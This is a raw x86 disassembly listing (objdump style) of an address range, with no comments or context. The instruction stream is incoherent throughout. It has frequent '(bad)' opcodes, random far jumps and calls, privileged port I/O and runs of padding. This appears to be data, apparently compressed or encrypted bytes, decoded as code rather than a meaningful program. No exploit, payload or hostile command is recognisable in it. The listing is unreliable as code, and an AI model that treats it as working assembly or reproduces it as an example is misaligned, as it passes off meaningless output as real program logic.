  42802c:	retf   
  42802d:	out    dx,eax
  42802e:	test   eax,0x2900fbf2
  428033:	jecxz  0x428075
  428035:	pop    ebx
  428036:	or     esp,DWORD PTR [esi-0x68]
  428039:	mov    es,eax
  42803b:	pop    edi
  42803c:	add    BYTE PTR [edi+edx*2-0x73],al
  428040:	ins    DWORD PTR es:[edi],dx
  428041:	inc    edi
  428042:	jmp    DWORD PTR [esi]
  428044:	out    dx,eax
  428045:	arpl   dx,cx
  428047:	cmp    BYTE PTR [ecx+0x67],dh
  42804a:	jle    0x427fef
  42804c:	jmp    0x427feb
  42804e:	fst    QWORD PTR [ecx]
  428050:	and    esp,edx
  428052:	adc    ebx,DWORD PTR [ecx-0x7]
  428055:	sar    DWORD PTR [ecx-0x65],1
  428058:	inc    BYTE PTR [edx]
  42805a:	cdq    
  42805b:	push   edi
  42805c:	and    BYTE PTR [edx-0x3edb9989],0xfa
  428063:	xchg   edi,eax
  428064:	jg     0x42804a
  428066:	cmc    
  428067:	arpl   WORD PTR [ebx],cx
  428069:	mov    ebx,0xcbac6aca
  42806e:	retf   0x7062
  428071:	pop    ecx
  428072:	push   ebx
  428073:	int3   
  428074:	xor    ah,dl
  428076:	mov    edi,0xe9690103
  42807b:	xchg   DWORD PTR [ebx],ebx
  42807d:	adc    al,0xca
  42807f:	(bad)  
  428080:	(bad)  
  428081:	pop    DWORD PTR [ecx]
  428083:	jmp    0xef91b00a
  428088:	stc    
  428089:	push   eax
  42808a:	pop    ebp
  42808b:	cld    
  42808c:	scas   eax,DWORD PTR es:[edi]
  42808d:	fld    TBYTE PTR [edi-0x1]
  428090:	cld    
  428091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428092:	cdq    
  428093:	pop    edi
  428094:	sahf   
  428095:	mov    eax,fs:0x634e819f
  42809b:	cdq    
  42809c:	xchg   edi,eax
  42809d:	(bad)  
  42809e:	das    
  42809f:	into   
  4280a0:	mov    ebp,0xbb9b983f
  4280a5:	int    0xe5
  4280a7:	jg     0x428097
  4280a9:	pop    ds
  4280aa:	fcmovu st,st(4)
  4280ac:	dec    ebx
  4280ad:	pop    esp
  4280ae:	cli    
  4280af:	sub    dl,BYTE PTR [ecx+0x46418801]
  4280b5:	enter  0x4727,0x85
  4280b9:	ins    DWORD PTR es:[edi],dx
  4280ba:	push   ecx
  4280bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280bc:	dec    ebx
  4280bd:	jnp    0x4280e3
  4280bf:	adc    al,BYTE PTR [ebx]
  4280c1:	xchg   esp,eax
  4280c2:	fs in  al,dx
  4280c4:	ja     0x4280c6
  4280c6:	pop    ebx
  4280c7:	enter  0xa959,0xc5
  4280cb:	popa   
  4280cc:	(bad)  
  4280cd:	jmp    0xdad79aba
  4280d2:	add    BYTE PTR [ebx-0x52],ah
  4280d5:	es push edx
  4280d7:	push   eax
  4280d8:	(bad)  
  4280d9:	ins    DWORD PTR es:[edi],dx
  4280da:	jo     0x4280c6
  4280dc:	push   ds
  4280dd:	das    
  4280de:	fs push 0x3c12904f
  4280e4:	sar    BYTE PTR [eax+esi*4+0x5da94003],1
  4280eb:	in     eax,0xc6
  4280ed:	mul    dh
  4280ef:	aad    0x96
  4280f1:	mov    edi,0x2449f812
  4280f6:	xor    ch,al
  4280f8:	inc    ecx
  4280f9:	adc    eax,esp
  4280fb:	pop    esp
  4280fc:	push   ds
  4280fd:	inc    ebp
  4280fe:	pop    ebx
  4280ff:	sub    eax,0xbc797ea7
  428104:	popf   
  428105:	dec    esp
  428106:	push   ecx
  428107:	stos   DWORD PTR es:[di],eax
  428109:	inc    ebx
  42810a:	fst    QWORD PTR [esi]
  42810c:	pop    esp
  42810d:	cdq    
  42810e:	xchg   esp,eax
  42810f:	adc    dl,BYTE PTR [eax+eax*1+0x0]
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	les    ecx,FWORD PTR [eax-0x45]
  428183:	mov    cl,BYTE PTR [edi]
  428185:	lods   eax,DWORD PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0x64000001
  42818d:	loop   0x428191
  42818f:	push   edx
  428190:	or     ecx,DWORD PTR [ebp+edi*1-0x7f]
  428194:	sbb    BYTE PTR [ecx],dh
  428196:	int    0xcf
  428198:	mov    dl,BYTE PTR [edi]
  42819a:	lahf   
  42819b:	test   eax,0xe9ad49cd
  4281a0:	or     edi,eax
  4281a2:	bound  eax,QWORD PTR ds:0x9e24de21
  4281a8:	frstor [edi]
  4281aa:	subps  xmm4,XMMWORD PTR [edi]
  4281ad:	int    0x6a
  4281af:	(bad)  
  4281b0:	in     al,dx
  4281b1:	rcl    ecx,1
  4281b3:	adc    eax,DWORD PTR [edi]
  4281b5:	shl    bh,cl
  4281b7:	jnp    0x4281a9
  4281b9:	mov    ds:0xaea7d1a8,al
  4281be:	mov    esp,ebp
  4281c0:	xor    al,0x46
  4281c2:	jae    0x428232
  4281c4:	mov    dh,0x80
  4281c6:	push   edx
  4281c8:	xchg   ecx,eax
  4281c9:	mov    ah,0x2a
  4281cb:	sti    
  4281cc:	dec    esi
  4281cd:	out    0xca,eax
  4281cf:	mov    DWORD PTR [edx],esi
  4281d1:	mov    ch,0x73
  4281d3:	test   BYTE PTR [edi],bl
  4281d5:	pop    ebp
  4281d6:	push   ecx
  4281d7:	add    ebp,0xffffff86
  4281da:	shr    DWORD PTR [edx+esi*8],cl
  4281dd:	adc    edi,eax
  4281df:	maskmovq mm1,mm5
  4281e2:	ds call 0x3375:0x407bb330
  4281ea:	fnstsw WORD PTR [edi+0x31]
  4281ed:	mov    al,ds:0xa52f3071
  4281f2:	pop    ebp
  4281f3:	sbb    esi,DWORD PTR [eax-0x1f]
  4281f6:	jl     0x428229
  4281f8:	or     ecx,edi
  4281fa:	pop    ss
  4281fb:	fist   DWORD PTR [ebx]
  4281fd:	pop    ebp
  4281fe:	in     al,0x40
  428200:	sub    esi,eax
  428202:	(bad)  
  428203:	aad    0x25
  428205:	push   esi
  428206:	xchg   DWORD PTR [ebp-0x57f63099],ebx
  42820c:	dec    ebx
  42820d:	lods   eax,DWORD PTR ds:[esi]
  42820e:	xchg   BYTE PTR [edi],dh
  428210:	or     edi,DWORD PTR [ebx]
  428212:	retf   
  428213:	inc    esp
  428214:	jp     0x4281c2
  428216:	daa    
  428217:	enter  0x195c,0xdb
  42821b:	clc    
  42821c:	int    0x85
  42821e:	adc    BYTE PTR [ebx-0x2],dl
  428221:	mov    bh,0xbd
  428223:	or     BYTE PTR [eax-0x3a52b297],dh
  428229:	inc    ebx
  42822a:	xchg   esp,eax
  42822b:	push   eax
  42822c:	cmp    bh,BYTE PTR [edi]
  42822e:	data16 cmp BYTE PTR [eax-0x7],0x57
  428233:	cld    
  428234:	aas    
  428235:	mov    cl,0x85
  428237:	into   
  428238:	mov    al,ds:0xddf4cd91
  42823d:	mov    ebx,0x19bb5c8a
  428242:	jecxz  0x428213
  428244:	mov    BYTE PTR [esi-0x57],ch
  428247:	push   cs
  428248:	inc    ebx
  428249:	mov    DWORD PTR [ecx+0x3a102738],ebx
  42824f:	sbb    DWORD PTR [ebx],eax
  428251:	loope  0x42822a
  428253:	loop   0x428245
  428255:	mov    edi,0x11462915
  42825a:	loopne 0x42822a
  42825c:	mov    ah,BYTE PTR [edx+0x63]
  42825f:	sahf   
  428260:	dec    ecx
  428261:	jle    0x42824c
  428263:	mov    ds:0xb00b9cba,al
  428268:	jmp    0x428218
  42826a:	fadd   QWORD PTR ds:0x6b7d07ae
  428270:	and    ah,BYTE PTR ds:[eax-0x45fc4ca3]
  428277:	fisubr WORD PTR [ebp+0x5f68dab2]
  42827d:	sub    al,BYTE PTR [edi-0x80]
  428280:	xchg   edi,eax
  428281:	fmulp  st(1),st
  428283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428284:	dec    esi
  428285:	pop    esp
  428286:	xchg   esp,eax
  428287:	imul   esp,DWORD PTR [ecx],0xffffffc1
  42828a:	cdq    
  42828b:	xchg   edx,eax
  42828c:	sar    ebp,cl
  42828e:	pop    edi
  42828f:	inc    ebp
  428290:	add    al,0x0
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	sub    al,0xd2
  428302:	inc    esp
  428303:	in     al,0x14
  428305:	scas   al,BYTE PTR es:[edi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x9e000001
  42830d:	push   ebx
  42830e:	out    dx,al
  42830f:	ret    0x734b
  428312:	push   es
  428313:	adc    DWORD PTR [edi+0x60],ecx
  428316:	fwait
  428317:	push   esi
  428318:	jae    0x42832f
  42831a:	cmp    DWORD PTR [eax+0x58a0a223],ebp
  428320:	inc    esi
  428321:	sbb    al,0xd3
  428323:	in     al,0x20
  428325:	push   ecx
  428326:	jo     0x428344
  428328:	cmp    bh,BYTE PTR [eax]
  42832a:	pop    eax
  42832b:	xor    BYTE PTR [eax],0x28
  42832e:	cs test eax,0x767a16b
  428334:	mov    bl,0xc3
  428336:	pop    ebx
  428337:	mov    ds:0x1b4bdc84,al
  42833c:	rol    dl,1
  42833e:	daa    
  42833f:	(bad)  [ecx]
  428341:	inc    edx
  428342:	cmp    bl,BYTE PTR [edx+ebp*1+0x5c]
  428346:	mov    ds:0xdc9baead,al
  42834b:	lods   al,BYTE PTR ds:[esi]
  42834c:	ficomp DWORD PTR [ecx-0x36c12cc6]
  428352:	nop
  428353:	xor    eax,0x98de2666
  428358:	dec    edx
  428359:	mov    ah,BYTE PTR [esi+0x55]
  42835c:	jnp    0x428371
  42835e:	xchg   edx,eax
  42835f:	sub    al,0xe0
  428361:	mov    ecx,0xb072dc98
  428366:	lahf   
  428367:	lahf   
  428368:	push   ecx
  428369:	pop    esp
  42836a:	test   eax,0x7e53acaf
  42836f:	in     al,dx
  428370:	(bad)  
  428372:	ds push ebp
  428374:	push   ebp
  428375:	and    eax,0x8f323ab0
  42837a:	arpl   WORD PTR [ecx],bx
  42837c:	push   esi
  42837d:	in     al,0xd4
  42837f:	or     DWORD PTR [esi+ebx*1-0x4f],esp
  428383:	jmp    0xe85:0x4837d7e3
  42838a:	ja     0x4283c5
  42838c:	dec    esi
  42838d:	ror    DWORD PTR [esi+ecx*1],0x4a
  428391:	sub    eax,0xb45e0653
  428396:	push   ebx
  428397:	sub    ch,BYTE PTR [eax+0x4b008306]
  42839d:	mov    WORD PTR [ecx+0x10],cs
  4283a0:	clc    
  4283a1:	add    dl,BYTE PTR [ecx-0x711ef03c]
  4283a7:	push   ss
  4283a8:	loop   0x428339
  4283aa:	sub    DWORD PTR [esi],ecx
  4283ac:	fstp   QWORD PTR [esi-0x61]
  4283af:	jbe    0x428416
  4283b1:	xchg   esp,eax
  4283b2:	retf   0xfcc2
  4283b5:	pop    edx
  4283b6:	pop    eax
  4283b7:	in     al,0x9a
  4283b9:	jge    0x428365
  4283bb:	popa   
  4283bc:	outs   dx,DWORD PTR ds:[esi]
  4283bd:	aaa    
  4283be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283bf:	imul   ebx,ebp,0xa7eab241
  4283c5:	mov    al,ds:0xc1512f1b
  4283ca:	scas   eax,DWORD PTR es:[edi]
  4283cb:	jg     0x42838f
  4283cd:	sbb    eax,DWORD PTR [ebp+0x40]
  4283d0:	sbb    al,0x64
  4283d2:	pop    ds
  4283d3:	int    0x5b
  4283d5:	daa    
  4283d6:	add    al,0xf8
  4283d8:	bound  ebp,QWORD PTR [eax+ebx*1+0x30]
  4283dc:	add    DWORD PTR [eax+ebp*4+0x68],ebx
  4283e0:	dec    esi
  4283e1:	and    esi,DWORD PTR [edi-0x80]
  4283e4:	test   al,0xc0
  4283e6:	gs call 0xf549:0x33d7cbb5
  4283ee:	push   esp
  4283ef:	int    0x86
  4283f1:	sub    ebx,esp
  4283f3:	mov    ch,0x35
  4283f5:	and    BYTE PTR [ebx+0x3b351d98],cl
  4283fb:	push   eax
  4283fc:	inc    edi
  4283fd:	(bad)  
  4283ff:	ss lds ebx,FWORD PTR ss:[ebx]
  428403:	adc    dh,BYTE PTR [ebx]
  428405:	nop
  428406:	(bad)  [edi+0x4]
  428409:	rcr    DWORD PTR [ecx+0x9],0x2b
  42840d:	ins    DWORD PTR es:[edi],dx
  42840e:	push   es
  42840f:	sub    al,0xd5
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xb7abfb32
  428481:	pop    ds
  428482:	or     edi,DWORD PTR [ebx+0x1af19]
  428488:	add    eax,0x14000001
  42848d:	jmp    0xce15de44
  428492:	inc    ebp
  428493:	test   eax,0xc76f9e6e
  428498:	rcl    DWORD PTR [edi],1
  42849a:	jne    0x428456
  42849c:	push   eax
  42849d:	lea    esp,[esi+0x5c]
  4284a0:	scas   al,BYTE PTR es:[edi]
  4284a1:	adc    BYTE PTR [esi+0x28],0x73
  4284a5:	sub    eax,0x407fd2c8
  4284aa:	push   ecx
  4284ab:	std    
  4284ac:	push   ebp
  4284ad:	retf   0x9dea
  4284b0:	fst    st(2)
  4284b2:	scas   eax,DWORD PTR es:[edi]
  4284b3:	cmp    eax,0xee1e23e2
  4284b8:	fidivr DWORD PTR [esp+edx*8]
  4284bb:	inc    eax
  4284bc:	adc    al,0xc7
  4284be:	fs pusha 
  4284c0:	sbb    bh,BYTE PTR [eax-0x9]
  4284c3:	mov    ah,BYTE PTR [eax]
  4284c5:	js     0x4284bf
  4284c7:	push   0x97ed6e68
  4284cc:	and    dl,BYTE PTR [eax+0x7ebfa39]
  4284d2:	push   edx
  4284d3:	pushf  
  4284d4:	xlat   BYTE PTR ds:[ebx]
  4284d5:	add    cl,BYTE PTR [ecx]
  4284d7:	cmovo  edx,DWORD PTR [ebx]
  4284da:	or     ecx,0xcd0ce81d
  4284e0:	outs   dx,BYTE PTR ds:[esi]
  4284e1:	loope  0x4284e8
  4284e3:	inc    edi
  4284e4:	mov    ecx,0x72ad2494
  4284e9:	fld    TBYTE PTR [eax+0xad02a60]
  4284ef:	push   esi
  4284f0:	jg     0x42848d
  4284f2:	outs   dx,BYTE PTR ds:[esi]
  4284f3:	neg    eax
  4284f5:	pop    esi
  4284f6:	mov    esi,0x68045bbf
  4284fb:	dec    esi
  4284fc:	outs   dx,DWORD PTR ds:[esi]
  4284fd:	out    0x45,al
  4284ff:	mov    al,ds:0x46e09130
  428504:	lods   eax,DWORD PTR ds:[esi]
  428505:	dec    ecx
  428506:	test   esp,eax
  428508:	sub    dh,BYTE PTR [ebx]
  42850a:	push   es
  42850b:	push   0x53d5c473
  428510:	push   edx
  428511:	push   ss
  428512:	(bad)  
  428515:	push   ebp
  428516:	idiv   DWORD PTR [edi-0x7f403d4f]
  42851c:	fcom   DWORD PTR [ecx+0xc]
  42851f:	mov    eax,edx
  428521:	inc    esp
  428522:	loop   0x4284e8
  428524:	jmp    0x5c2fd038
  428529:	scas   al,BYTE PTR es:[edi]
  42852a:	bound  ecx,QWORD PTR [edi-0x1a]
  42852d:	mov    ebx,DWORD PTR [edi-0x5f768bd9]
  428533:	iret   
  428534:	xor    esi,DWORD PTR ds:0x279ca90
  42853a:	mov    eax,0x4f3a4dfb
  42853f:	imul   edx,DWORD PTR [esi],0xec84240d
  428545:	gs jb  0x4285c4
  428548:	cmp    BYTE PTR [esi],dh
  42854a:	into   
  42854b:	repz xchg edi,eax
  42854d:	in     al,0x34
  42854f:	add    DWORD PTR [ebp+0x1f],esi
  428552:	hlt    
  428553:	loope  0x428599
  428555:	loope  0x428562
  428557:	fs cs xchg ebx,eax
  42855a:	cdq    
  42855b:	scas   eax,DWORD PTR es:[edi]
  42855c:	and    esp,DWORD PTR ds:0x82e515b5
  428562:	(bad)  
  428563:	pop    eax
  428564:	(bad)  
  428565:	mov    al,ds:0xc1054945
  42856a:	out    0xc,al
  42856c:	ret    0x1089
  42856f:	daa    
  428570:	cmc    
  428571:	or     BYTE PTR [edi-0x709c0950],bh
  428577:	sbb    BYTE PTR [eax],0x7
  42857a:	call   0xa160:0x64c73e06
  428581:	mov    dh,0x86
  428583:	ret    
  428584:	or     eax,DWORD PTR [esi]
  428586:	xchg   esi,eax
  428587:	imul   eax,DWORD PTR [ecx-0x54395fac],0xdfefdb21
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x13a3f6
  428602:	cmp    al,0x4e
  428604:	push   ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x39000001,al
  42860d:	cmp    dh,BYTE PTR [ebp+eiz*1-0x60]
  428611:	jge    0x4285a4
  428613:	push   esi
  428614:	pop    ecx
  428615:	ja     0x42865d
  428617:	jle    0x4285b9
  428619:	sti    
  42861a:	leave  
  42861b:	jbe    0x42869c
  42861d:	or     DWORD PTR [edi-0x73],esp
  428620:	and    BYTE PTR [ecx+edx*2],dl
  428623:	lea    edi,[ecx-0x1eeb0261]
  428629:	fisttp QWORD PTR [edi+0x777aba7c]
  42862f:	jecxz  0x428685
  428631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428632:	int3   
  428633:	pop    ss
  428634:	xchg   DWORD PTR [edx-0x3852ae82],ebx
  42863a:	push   ds
  42863b:	ins    DWORD PTR es:[edi],dx
  42863c:	jmp    0x42862d
  42863e:	pop    ecx
  42863f:	je     0x428676
  428641:	jle    0x4285f9
  428643:	push   esp
  428644:	inc    ebp
  428645:	mov    edi,0xc79fdce9
  42864a:	push   ebp
  42864b:	pop    edi
  42864c:	(bad)  
  42864d:	jbe    0x428643
  42864f:	rcl    DWORD PTR [eax+0x16],cl
  428652:	mov    DWORD PTR [edx],edx
  428654:	add    BYTE PTR [ecx+esi*4-0x613a9e5e],0x54
  42865c:	jp     0x4286b9
  42865e:	adc    al,0x40
  428660:	pop    ebp
  428661:	setbe  cl
  428664:	sar    BYTE PTR [edx-0x10],0x7f
  428668:	aad    0xf7
  42866a:	mov    DWORD PTR [eiz*8+0x10570fb7],ebp
  428671:	stos   DWORD PTR es:[edi],eax
  428672:	sub    eax,0xa3b88555
  428677:	cs mov edx,0x5616c33e
  42867d:	mov    ebp,0x33d4e393
  428682:	pop    edi
  428683:	fsub   QWORD PTR [eax]
  428685:	ja     0x4286ed
  428687:	push   esp
  428688:	imul   esi,DWORD PTR [ecx+ebx*4+0x3d0536b9],0x9c632922
  428693:	jno    0x4286a3
  428695:	test   ch,dl
  428697:	adc    ebp,DWORD PTR [edi]
  428699:	fisubr DWORD PTR [eax+esi*1+0x354ecae6]
  4286a0:	out    0x1,al
  4286a2:	(bad)  
  4286a4:	xchg   ebp,eax
  4286a5:	ja     0x42867e
  4286a7:	imul   eax,DWORD PTR ds:0xf985b262,0x3118dd23
  4286b1:	or     bh,al
  4286b3:	xchg   edi,eax
  4286b4:	aad    0x7d
  4286b6:	retf   
  4286b7:	pushf  
  4286b8:	daa    
  4286b9:	loope  0x4286ee
  4286bb:	push   es
  4286bc:	mov    BYTE PTR [edi+0x26],al
  4286bf:	test   al,0xca
  4286c1:	mov    edx,0xac9dbadd
  4286c6:	div    BYTE PTR [edi]
  4286c8:	fnsetpm(287 only) 
  4286ca:	rcl    ebx,0xda
  4286cd:	in     al,dx
  4286ce:	repz mov ebx,0xe7ec0a9f
  4286d4:	ins    DWORD PTR es:[edi],dx
  4286d5:	push   edx
  4286d6:	dec    ebx
  4286d7:	jmp    0xa17e:0x545ae54b
  4286de:	pop    ecx
  4286df:	cmp    DWORD PTR [ebx-0x2b4ea0e0],esp
  4286e5:	push   ebp
  4286e6:	scas   al,BYTE PTR es:[edi]
  4286e7:	and    bl,ch
  4286e9:	dec    ebp
  4286ea:	and    DWORD PTR [edx+edx*2+0x7e],ebp
  4286ee:	inc    eax
  4286ef:	mov    bh,al
  4286f1:	jnp    0x428744
  4286f3:	xchg   ebx,eax
  4286f4:	pop    es
  4286f5:	inc    ebp
  4286f6:	cmp    eax,0x63d32195
  4286fb:	sub    DWORD PTR [ecx],ebp
  4286fd:	inc    edi
  4286fe:	call   0xc030:0xff008f0f
  428705:	inc    ebx
  428706:	jno    0x4286da
  428708:	pushf  
  428709:	xchg   ecx,eax
  42870a:	hlt    
  42870b:	fs push ecx
  42870d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42870e:	add    DWORD PTR [edx+0x70],ebp
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xce065796
  428783:	mov    db6,ecx
  428786:	add    DWORD PTR [eax],eax
  428788:	add    eax,0x48000001
  42878d:	sub    al,0xf6
  42878f:	jmp    0x3a4a:0x24603878
  428796:	pop    esi
  428797:	arpl   WORD PTR cs:[edx],dx
  42879a:	and    DWORD PTR [ecx+0x2973babe],edi
  4287a0:	cs xchg ebx,eax
  4287a2:	(bad)  
  4287a3:	pop    ds
  4287a4:	ss iret 
  4287a6:	xor    eax,DWORD PTR [ebx]
  4287a8:	pushf  
  4287a9:	xchg   edx,eax
  4287aa:	shl    BYTE PTR ds:0xc736fb7,cl
  4287b0:	inc    ecx
  4287b1:	inc    edi
  4287b2:	retf   
  4287b3:	in     eax,0xa8
  4287b5:	mov    eax,DWORD PTR [esi+0x43]
  4287b8:	out    0xf2,eax
  4287ba:	dec    eax
  4287bb:	xchg   esi,eax
  4287bc:	popa   
  4287bd:	add    al,0x23
  4287bf:	ret    0x65c0
  4287c2:	sub    eax,0x8be10505
  4287c7:	in     eax,0x15
  4287c9:	loopne 0x42881e
  4287cb:	xor    eax,0xfae0a1b9
  4287d0:	(bad)  
  4287d1:	sbb    dh,BYTE PTR [eax]
  4287d3:	ins    DWORD PTR es:[edi],dx
  4287d4:	outs   dx,DWORD PTR ds:[esi]
  4287d5:	or     dh,BYTE PTR [esi]
  4287d7:	ds push eax
  4287d9:	outs   dx,BYTE PTR ds:[esi]
  4287da:	xor    esp,DWORD PTR [eax-0x7b]
  4287dd:	call   0x194bdde0
  4287e2:	mov    ecx,?
  4287e4:	popf   
  4287e5:	cmp    eax,esp
  4287e7:	cli    
  4287e8:	adc    al,0x63
  4287ea:	nop
  4287eb:	outs   dx,BYTE PTR ds:[esi]
  4287ec:	pusha  
  4287ed:	push   edx
  4287ee:	cdq    
  4287ef:	and    BYTE PTR [eax],dl
  4287f1:	mov    ch,ch
  4287f3:	sub    BYTE PTR [ecx],0x35
  4287f6:	enter  0x137c,0x73
  4287fa:	(bad)  
  4287fb:	xor    edx,DWORD PTR [esi+0x14]
  4287fe:	sahf   
  4287ff:	pusha  
  428800:	sub    ebp,ebp
  428802:	retf   
  428803:	push   esi
  428804:	jg     0x42882c
  428806:	mov    ecx,DWORD PTR [eax-0x15]
  428809:	push   ss
  42880a:	mov    eax,0x1f7d789f
  42880f:	out    0x28,eax
  428811:	lods   eax,DWORD PTR ds:[esi]
  428812:	sub    BYTE PTR [esi+ebx*8+0x44],0x5f
  428817:	jl     0x42887c
  428819:	cmp    BYTE PTR [edx-0x65b76f0c],ch
  42881f:	loopne 0x428883
  428821:	ret    0x989a
  428824:	mov    ecx,0x6be0b96
  428829:	cmp    al,0xc0
  42882b:	mov    WORD PTR [ecx],fs
  42882d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42882e:	shl    DWORD PTR [ebx-0x12],1
  428831:	mov    bl,0x8d
  428833:	mov    ch,0xd1
  428835:	mov    al,0x1
  428837:	sar    DWORD PTR [esi],cl
  428839:	call   0x8be3:0x78fb285c
  428840:	out    dx,al
  428841:	stos   DWORD PTR es:[edi],eax
  428842:	out    0x4c,eax
  428844:	lods   al,BYTE PTR ds:[esi]
  428845:	retf   0x2d78
  428848:	pop    ebp
  428849:	sahf   
  42884a:	mov    ebp,0x2519d09b
  42884f:	lods   al,BYTE PTR ds:[esi]
  428850:	fisubr WORD PTR [edx]
  428852:	inc    edi
  428853:	stc    
  428854:	fwait
  428855:	inc    eax
  428856:	pop    ss
  428857:	inc    esp
  428858:	sbb    al,0xdd
  42885a:	ret    0xd29c
  42885d:	jnp    0x428864
  42885f:	inc    ebp
  428860:	stc    
  428861:	lahf   
  428862:	loope  0x428889
  428864:	mov    edx,0xf1ba624e
  428869:	add    DWORD PTR [ebp+0x78],esp
  42886c:	jae    0x428829
  42886e:	ret    0xc805
  428871:	mov    dl,0x54
  428873:	std    
  428874:	jne    0x4287fa
  428876:	inc    esp
  428877:	pop    ecx
  428878:	cmp    dh,BYTE PTR [edi+0x2b]
  42887b:	add    eax,0xfb4c6713
  428880:	dec    esp
  428881:	ins    DWORD PTR es:[edi],dx
  428882:	push   edi
  428883:	sub    eax,0x2d27b686
  428888:	xchg   esi,eax
  428889:	mov    bh,0xb
  42888b:	mov    ds:0x54010507,al
  428890:	mov    bh,0x0
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x79749d0f],bx
  428902:	xor    DWORD PTR [eax+ebp*1],0x50001b2
  428909:	add    DWORD PTR [eax],eax
  42890b:	add    BYTE PTR [esi],cl
  42890d:	stc    
  42890e:	aam    0x9c
  428910:	adc    BYTE PTR [esi+0x40608146],dh
  428916:	push   eax
  428917:	mov    edi,0x4d8d6c17
  42891c:	jp     0x4288fa
  42891e:	fbstp  TBYTE PTR [ecx+0x6c]
  428921:	mov    dl,0x3f
  428923:	dec    ebx
  428924:	add    bl,0x34
  428927:	jle    0x42891b
  428929:	retf   
  42892a:	paddd  mm2,mm4
  42892d:	sbb    DWORD PTR [esi-0x7e],eax
  428930:	arpl   WORD PTR [esi],bx
  428932:	jmp    0xc6476929
  428937:	sub    eax,0x6f305922
  42893c:	xor    dl,BYTE PTR [esi+0x71]
  42893f:	mov    cl,0x5e
  428941:	fwait
  428942:	stos   DWORD PTR es:[edi],eax
  428943:	call   0x28c5:0xd09af327
  42894a:	mov    bl,0xdb
  42894c:	or     ebx,DWORD PTR [ebp-0x1f]
  42894f:	leave  
  428950:	mov    ch,0x1d
  428952:	jae    0x428943
  428954:	xor    DWORD PTR [edx+0x27d03642],ecx
  42895a:	aad    0x93
  42895c:	retf   
  42895d:	ds jmp 0x84a2710b
  428963:	test   DWORD PTR [ebx+0x38913a4],edi
  428969:	inc    ebp
  42896a:	cmp    ebx,DWORD PTR [eax+0x96ccd08]
  428970:	mov    dh,0xbf
  428972:	fdivr  st(7),st
  428974:	ja     0x428963
  428976:	sbb    eax,0x85bfe7e8
  42897b:	(bad)  
  42897c:	xor    BYTE PTR [edi+0x217d2a40],bl
  428982:	pop    ss
  428983:	ror    BYTE PTR [edi-0x4bb03095],cl
  428989:	jnp    0x4289ce
  42898b:	fs add eax,0x19b91e49
  428991:	(bad)  
  428992:	mov    DWORD PTR [ecx+edx*2-0x68b3b7c1],esi
  428999:	idiv   DWORD PTR [edi+0x7e8ae68e]
  42899f:	hlt    
  4289a0:	pop    esp
  4289a1:	jecxz  0x42894a
  4289a3:	cmp    edx,DWORD PTR [eax+0x0]
  4289a6:	mov    ds:0xdc2db83a,eax
  4289ab:	add    ecx,DWORD PTR [ebp-0x12]
  4289ae:	sub    DWORD PTR [eax],eax
  4289b0:	ret    
  4289b1:	or     bh,dh
  4289b3:	inc    ecx
  4289b4:	(bad)  
  4289b5:	popf   
  4289b6:	jp     0x4289b9
  4289b8:	jle    0x428a15
  4289ba:	mov    cl,0x2b
  4289bc:	xlat   BYTE PTR ds:[ebx]
  4289bd:	int    0x4f
  4289bf:	fsubr  st(6),st
  4289c1:	pop    edi
  4289c2:	mov    esp,0xe6ce5061
  4289c7:	sub    eax,0x635a65bd
  4289cc:	aas    
  4289cd:	add    ah,BYTE PTR [edx]
  4289cf:	ins    DWORD PTR es:[edi],dx
  4289d0:	fdiv   DWORD PTR [ebp+0x5e384231]
  4289d6:	xchg   di,ax
  4289d9:	fwait
  4289da:	add    dh,BYTE PTR [ebp-0x5b]
  4289dd:	and    eax,0xcaf63390
  4289e2:	jmp    0x7548:0x485f1f97
  4289e9:	cli    
  4289ea:	cmp    al,0x71
  4289ec:	xchg   DWORD PTR [edi+ebp*1],eax
  4289ef:	fist   DWORD PTR [edi]
  4289f1:	inc    ebx
  4289f3:	je     0x4289ba
  4289f5:	test   eax,0xbc3b347a
  4289fa:	xor    ecx,edi
  4289fc:	int    0xa6
  4289fe:	lds    edx,FWORD PTR [ebx+0x53]
  428a01:	mov    WORD PTR [ecx+ecx*2-0x5f832a4a],gs
  428a08:	ret    0x4883
  428a0b:	pop    es
  428a0c:	mov    bl,0x33
  428a0e:	stc    
  428a0f:	mov    dl,0xa2
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x59b913]
  428a83:	jmp    0x105:0x1b32d
